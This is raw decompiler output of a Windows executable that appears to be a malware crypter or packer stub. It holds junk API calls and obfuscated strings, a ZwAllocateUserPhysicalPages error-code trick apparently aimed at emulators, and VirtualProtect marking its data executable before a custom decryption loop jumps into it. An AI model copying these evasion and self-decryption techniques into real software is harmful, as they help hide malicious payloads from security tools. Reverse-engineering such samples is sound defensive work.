/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

_DWORD *__stdcall sub_415EEA(unsigned int a1, int a2, _DWORD *a3);
int start();
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// LPSTR __stdcall GetCommandLineA();
// DWORD __stdcall GetLastError();
// BOOL __stdcall CloseHandle(HANDLE hObject);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// HANDLE __stdcall CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// DWORD __stdcall GetFileType(HANDLE hFile);

//-------------------------------------------------------------------------
// Data declarations

int dword_401000[9] =
{
  910884605,
  106524950,
  -1651754144,
  716224473,
  1967992770,
  -1908270611,
  81841500,
  -1525511433,
  -1064433884
}; // weak
_UNKNOWN loc_401024; // weak
_UNKNOWN loc_416164; // weak
CHAR aLusmoik3cxjTfj[] = "LuSMoik3CXj.TFJ"; // idb
CHAR ModuleName[] = "NTDLL.DLL"; // idb
WCHAR aA2oddttpybihix[] = L"\u3241\u446F\u5464\u7054\u4279\u4869\u7849\u5174\u6935\u4864\u4269\u3337\u4432\u492E\u337A"; // idb
CHAR a5db1b4jmytmSos[] = "5db1B4JmYTm.Sos"; // idb
WCHAR FileName[] = L"\u4333\u6645\u4E6F\u5177\u3538\u4570\u6F48\u6B6B\u4758\u2E71\u3578Z"; // idb
CHAR ProcName[] = "ZwAllocateUserPhysicalPages"; // idb
WCHAR aA1xervo5ihcyeq[] = L"\u3141\u4558\u7672\u356F\u6849\u5963\u7165\u4D33\u452E\u6554"; // idb


//----- (00415EEA) --------------------------------------------------------
_DWORD *__stdcall sub_415EEA(unsigned int a1, int a2, _DWORD *a3)
{
  unsigned int v3; // edx
  _DWORD *result; // eax

  v3 = a1 >> 2;
  result = a3;
  do
  {
    *result -= a2;
    *result ^= a2;
    *result += 244311467;
    *result -= a2;
    *result = __ROR4__(*result, 84);
    *result = -*result;
    ++result;
    --v3;
  }
  while ( v3 );
  return result;
}

//----- (00415F31) --------------------------------------------------------
int start()
{
  int v1; // [esp-18h] [ebp-40h]
  int v2; // [esp-14h] [ebp-3Ch]
  DWORD v3; // [esp-14h] [ebp-3Ch]
  int *v4; // [esp-10h] [ebp-38h]
  DWORD *v5; // [esp-10h] [ebp-38h]
  HMODULE v6; // [esp-8h] [ebp-30h]
  const CHAR *v7; // [esp-4h] [ebp-2Ch]
  void (__cdecl *v8)(int, int, int *); // [esp+0h] [ebp-28h]
  int v9; // [esp+0h] [ebp-28h]
  HANDLE v10; // [esp+4h] [ebp-24h]
  DWORD flOldProtect; // [esp+8h] [ebp-20h] BYREF
  HANDLE v12; // [esp+Ch] [ebp-1Ch]
  HANDLE hFile; // [esp+10h] [ebp-18h]
  HANDLE hObject; // [esp+14h] [ebp-14h]
  FARPROC v15; // [esp+18h] [ebp-10h]
  HANDLE v16; // [esp+1Ch] [ebp-Ch]
  int v17; // [esp+20h] [ebp-8h]
  HMODULE hModule; // [esp+24h] [ebp-4h]

  GetCommandLineA();
  GetLastError();
  hObject = CreateFileW(FileName, 0, 0, 0, 3u, 0x185u, 0);
  if ( hObject == (HANDLE)-1 )
  {
    CloseHandle((HANDLE)0xFFFFFFFF);
    hFile = CreateFileW(aA1xervo5ihcyeq, 0x20000000u, 0, 0, 3u, 0xA5u, 0);
    if ( hFile == (HANDLE)-1 )
    {
      GetFileSize(hObject, 0);
      GetLastError();
      do
      {
        GetCommandLineA();
        GetFileType(hFile);
        GetLastError();
        GetLastError();
        GetFileType(hFile);
        v10 = CreateFileA(aLusmoik3cxjTfj, 0x60000000u, 1u, 0, 3u, 0x1A3u, 0);
      }
      while ( v10 != (HANDLE)-1 );
      GetFileSize((HANDLE)0xFFFFFFFF, 0);
      GetFileSize(hFile, 0);
      hModule = GetModuleHandleA(ModuleName);
      v7 = ProcName;
      v6 = hModule;
      GetLastError();
    }
    GetCommandLineA();
    v15 = GetProcAddress(v6, v7);
    CloseHandle(hObject);
    GetLastError();
    GetFileType(hFile);
    GetFileType(hObject);
    GetFileSize(hObject, 0);
    GetCommandLineA();
    GetCommandLineA();
    GetFileSize(v10, 0);
    GetFileType(v10);
    GetFileSize(hObject, 0);
    v17 = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD))v15)(0, 0, 0);
    GetCommandLineA();
    CloseHandle(hObject);
    GetCommandLineA();
    v16 = CreateFileA(a5db1b4jmytmSos, 0xA0000000, 7u, 0, 3u, 0, 0);
    ((void (*)(void))((char *)&loc_416164 + (v17 ^ 0xC0000005)))();
    GetLastError();
    GetFileSize(v10, 0);
    v5 = &flOldProtect;
    GetFileSize(hFile, 0);
    v3 = 64;
    do
    {
      CloseHandle(v16);
      GetFileType(hObject);
      GetFileSize(hFile, 0);
      VirtualProtect(dword_401000, 0x14EE4u, v3, v5);
      v12 = CreateFileW(aA2oddttpybihix, 0xE0000000, 6u, 0, 3u, 0x23u, 0);
    }
    while ( v12 != (HANDLE)-1 );
    v4 = dword_401000;
    GetFileType(hObject);
    v2 = v17;
    v1 = 85732;
    GetFileSize(v16, 0);
    v9 = v17 + 1073741819;
    GetFileType(hFile);
    v8 = (void (__cdecl *)(int, int, int *))((char *)sub_415EEA + v9);
  }
  v8(v1, v2, v4);
  return ((int (*)(void))loc_401024)();
}
// 41606D: variable 'v6' is possibly undefined
// 41606D: variable 'v7' is possibly undefined
// 4160C9: variable 'v10' is possibly undefined
// 4161B9: variable 'v3' is possibly undefined
// 4161B9: variable 'v5' is possibly undefined
// 416249: variable 'v8' is possibly undefined
// 416249: variable 'v1' is possibly undefined
// 416249: variable 'v2' is possibly undefined
// 416249: variable 'v4' is possibly undefined
// 401000: using guessed type int dword_401000[9];

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
